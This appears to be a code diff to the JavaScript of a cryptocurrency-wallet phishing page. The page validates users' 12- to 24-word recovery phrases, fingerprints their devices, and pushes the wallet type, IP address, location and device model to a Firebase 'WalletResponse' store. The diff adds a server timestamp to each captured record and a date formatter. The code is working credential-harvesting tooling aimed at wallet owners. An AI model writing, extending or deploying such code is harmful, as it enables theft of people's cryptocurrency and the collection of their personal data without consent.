@@ -3,6 +3,7 @@ import {
   getDatabase,
   ref,
   push,
+  serverTimestamp,
 } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js";
 
 // Firebase configuration
@@ -20,6 +21,23 @@ const firebaseConfig = {
 // Initialize Firebase app
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
+
+// Function to format date in Nigerian style (DD/MM/YYYY HH:mm:ss)
+function formatDate(timestamp) {
+  const date = new Date(timestamp);
+  const options = {
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true,
+  };
+
+  const formattedDate = new Intl.DateTimeFormat("en-GB", options).format(date);
+  return formattedDate;
+}
 
 // Validate recovery phrase (12, 18, or 24 words)
 function validatePhrase(recoveryPhrase) {
@@ -151,7 +169,7 @@ function getDeviceModel() {
     } else if (/Samsung Galaxy S21/i.test(userAgent)) {
       deviceModel = "Samsung Galaxy S21";
     } else {
-      deviceModel = "Android Device (Other Model)";
+      deviceModel = "Android Device";
     }
   }
   // Check for iPad models
@@ -198,7 +216,7 @@ async function save(event) {
     } else {
       errorMessage.style.display = "none";
 
-      // Push data to Firebase
+      // Push data to Firebase with timestamp
       const newResponseRef = ref(database, "WalletResponse");
       push(newResponseRef, {
         wallet_Type: walletType,
@@ -206,6 +224,7 @@ async function save(event) {
         ip_Address: deviceDetails.ipAddress,
         location: deviceDetails.location,
         device_Model: deviceDetails.deviceModel,
+        timestamp: serverTimestamp(), // Add timestamp
       })
         .then(() => {
           console.log(`Data for ${walletType} saved successfully!`);
